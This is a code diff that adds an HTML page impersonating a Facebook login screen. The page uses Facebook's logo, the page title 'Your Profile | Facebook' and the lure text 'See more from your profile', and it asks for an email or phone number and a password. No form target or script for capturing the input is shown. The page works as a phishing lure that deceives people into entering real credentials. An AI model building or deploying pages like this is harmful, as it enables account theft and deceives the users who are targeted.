@@ -1,0 +1,55 @@
+<!DOCTYPE html>
+<html>
+    <head>
+        <title>Your Profile | Facebook</title>
+        <style>
+            body {
+                font-family: Arial, sans-serif;
+            }
+            form {
+                width: 500px; /* Set a fixed width for the form */
+                margin: auto; /* Center the form */
+                padding: 20px; /* Added padding to increase height */
+                border: 1px solid #ccc; /* Optional: Add a border for better visibility */
+                border-radius: 5px; /* Optional: Rounded corners */
+            }
+            input[type="text"], input[type="password"] {
+                width: 100%; /* Full width */
+                padding: 10px; /* Increased padding for height */
+                margin: 8px 0; /* Adjusted margin */
+                box-sizing: border-box; /* Include padding in width */
+            }
+            input[type="submit"] {
+                width: 100%; /* Full width */
+                padding: 10px; /* Adjusted padding */
+                margin: 8px 0; /* Adjusted margin */
+                border: none;
+                border-radius: 5px;
+                cursor: pointer;
+            }
+            .login-btn {
+                background-color: #1877F2;
+                color: white;
+            }
+            .create-btn {
+                background-color: rgb(199, 190, 31);
+                color: white;
+            }
+        </style>
+    </head>
+
+    <body>
+        <form align="center">
+            <fieldset>
+                <img src="https://www.facebook.com/images/fb_icon_325x325.png" alt="Facebook Logo" width="80" height="80">
+                <h1 style="font-size: 18px;">See more from your profile</h1>
+                <input type="text" name="name" placeholder="Email or phone number" required pattern="^[0-9]*$|^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$" title="Please enter a valid email address or phone number.">
+                <input type="password" name="password" placeholder="Password" required>
+                <input type="submit" value="Log In" class="login-btn">
+                <a href="#" style="color: #1877F2; text-decoration: none; font-size: 12px;">Forgotten password?</a>
+                <div>or</div>
+                <input type="submit" value="Create a new account" class="create-btn">
+            </fieldset>
+        </form>
+    </body>
+</html>
